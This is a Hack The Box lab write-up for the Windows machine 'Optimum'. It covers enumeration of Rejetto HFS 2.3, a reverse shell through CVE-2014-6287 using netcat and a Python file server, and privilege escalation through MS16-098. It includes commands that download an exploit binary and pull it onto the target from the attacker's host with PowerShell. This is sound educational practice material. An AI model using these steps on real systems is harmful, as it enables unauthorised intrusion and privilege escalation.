Here is another HTB post, but this time, we'll be interacting with an HTTPFileServer. Instead of using Metasploit, we'll be using Windows Exploit Suggester to find an exploit. Then we'll create a python server transfer the file so that we can execute it and gain root access. 

## Hack The Box

* Operating System: Windows 
* Difficulty: Easy

## Enumeration

First things first, let's start with a nmap scan.

<img src="/images/blog/optimum/nmapscan.jpg" alt="nmap scan">

	PORT   STATE SERVICE VERSION
	80/tcp open  http    HttpFileServer httpd 2.3
	|_http-server-header: HFS 2.3
	|_http-title: HFS /

From the results, there is only one port open, port 80, and the HTTP header mentions HFS, so we could be looking at an HTTPFileServer. If you’re not sure what an HTTPFileServer is, here’s a brief description:

*HTTP File Server, otherwise known as HFS, is a free web server specifically designed for publishing and sharing files. It's different from classic file sharing because it uses web technology to be more compatible with today's Internet. It also differs from classic web servers because it's very easy to use and runs "right out-of-the box".*

Let's take a closer look at HFS by visiting the webpage.

### Website Information

The first thing we can do is open the web browser and type in 10.10.10.8. 

<img src="/images/blog/optimum/website.jpg" alt="website 10.10.10.8">

Yup, it is an HTTPFileServer. At the top-left hand side, we can see that there’s a login feature, so I checked to see if there are any default credentials for HTTPFileServer–which there isn’t.

Next, I clicked on the HTTPFileServer 2.3 link on the bottom left-hand corner to see if I could find out more information about the server--and I did! It confirms that the server is running **Rejetto HttpFileServer 2.3**.

Not much else after using Gobuster and checking the source code, so let's see if we can find any exploits on Rejetto HTTPFileServer 2.3.

### Searchsploit 

Kali has searchsploit built-in, which searches in exploit-db database to see if there are any existing exploits. All of the exploits that you find in searchsploit are already downloaded onto the Kali machine too. To use it, we can type `searchsploit http` in the Kali terminal.

Rejetto HTTP File Server (HFS) 2.3.x looks good since it calls out the version we're using specifically. Upon further investigation, this exploit allows us to execute arbitrary programs via a %00 sequence. Here's more information regarding the vulnerability: 

*The findMacroMarker function in parserLib.pas in Rejetto HTTP File Server (aks HFS or HttpFileServer) 2.3x before 2.3c allows remote attackers to execute arbitrary programs via a %00 sequence in a search action.*

More information can be found here: [NIST: CVE-2014-6287](https://nvd.nist.gov/vuln/detail/CVE-2014-6287)

We can see that this is occurring in the python script too. In the image below, we can see %00 before the arbitrary code is executed.

Great, now that we know a bit more about the exploit, let's move on to the exploitation phase.

## Exploitation

Before we start exploitation, let's recap what we know so far: 

* Ran a nmap scan and found out that port 80 was open and currently running HFS.
* We found out which OS the HFS was running. 
* Next, we used searchsploit to find an exploit that allows us to execute arbitrary programs.

Okay, now that we've done a recap, let's give it a try.

### Gaining Reverse Shell

Before we can use the python script, let's read it first. I used the `gedit` command in case I needed to edit the script.. and we do. In this part of the script:

	ip_addr = "192.168.44.128" #local IP address
	local_port = "443" # Local Port number

We'll need to enter the: 

* local IP address = found by using ifconfig 
* local port number = this can be anything, I used 4444.

Once we save the changes above, we can follow the instructions found in the python script to run it. In this case, it looks like we need to have a web server hosting netcat that has a nc.exe file, we can use the `locate` command to find it in Kali.

As a helpful tip, I like to have all the files I need for a particular box in its own directory for easy access. For example, both the nc.exe and 39161.py are in a directory called optimum. 

Once we have all the files ready, we can open up three different terminal windows: 

* `python 39161.py 10.10.10.8 80` = run the exploit (python script).
* `nc -lnvp 4444` = created a ncat listener on the same port number mentioned in the script. 
* `python -m SimpleHTTPServer 80` = to host the nc.exe file needed to execute the script.

And there we go! You can see in shell window #2 that we have access to the box. 

From the target's command line, we can use the following commands:

* `whoami` = determine what user we are logged into.
* `systeminfo` = find out more information about the system.

Based on `whoami` we know that we’re logged in as kostas. Since we are not logged in as root, let's see if we can gain root access.

### Privilege Escalation

Since we have access to the targets machine and can run the `systeminfo command`, we can use Windows Exploit Suggester to see if it can locate any vulnerabilities.

Here's the GitHub repository for it: [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

Before running Windows Exploit Suggester, we'll need to copy the information found in `systeminfo` and paste it into a .txt file. I just named mine systeminfo.txt to make it easier. 

Once the file is created, we'll type in Kali terminal: 

	./windows-exploit-suggester.py --database 2020-05-27-mssb.xls --systeminfo systeminfo.txt

There are tons of exploits found for this machine, so the process of elimination, I went from top to bottom and removed any exploits that would not complete a privilege escalation. Eventually, I found this one:

`[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow`

And taking a look a closer look at the details for this exploit, it calls out MS16-098: 

*This security update resolves vulnerabilities in Microsoft Windows. The vulnerabilities could allow elevation of privilege if an attacker logs on to an affected system and runs a specially crafted application that could exploit the vulnerabilities and take control of an affected system.*

This looks interesting, so we'll give it a try! 

In Kali, we'll first want to download the exploit.

	wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe

Next, we'll want to create a python server in Kali that will host the exploit.

	python -m SimpleHTTPServer 4444

Lastly, we'll want to download the exploit from the python server into the target machine. 

	powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.2:4443/41020.exe', 'c:\Users\Public\Downloads\41020.exe')"

Here goes nothing....

Did we do it? I think we did! We can confirm that we have root access by typing `whoami`. In this case, we have authority/system which is root!

## Conclusion

Enumerate. Enumerate. Enumerate. I had a hard time with the privilege escalation on this box. But it helped when I found out more information about the machine, what OS it's running, the architecture, etc.

Also, this box goes to show how critical it is to complete updates. Since we found out the OS of the HFS Server and upon further investigation realized that the Windows OS wasn't patched, we were able to gain root access. This is why it's so important to update! Especially if there are any existing vulnerabilities.
